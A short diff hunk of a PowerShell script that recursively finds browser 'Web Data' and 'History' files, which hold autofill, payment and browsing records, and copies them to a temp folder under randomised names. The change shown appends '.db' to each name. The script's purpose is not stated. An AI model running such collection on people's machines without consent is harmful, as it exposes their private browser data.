@@ -23,7 +23,7 @@ if (!(Test-Path $tempFolder)){
 $filesToCopy = Get-ChildItem -Path $sourceDir -Filter '*' -Recurse | Where-Object { $_.Name -like 'Web Data' -or $_.Name -like 'History' }
 foreach ($file in $filesToCopy) {
     $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
-    $newFileName = $file.BaseName + "_" + $randomLetters + $file.Extension
+    $newFileName = $file.BaseName + "_" + $randomLetters + $file.Extension + '.db'
     $destination = Join-Path -Path $tempFolder -ChildPath $newFileName
     Copy-Item -Path $file.FullName -Destination $destination -Force
 }
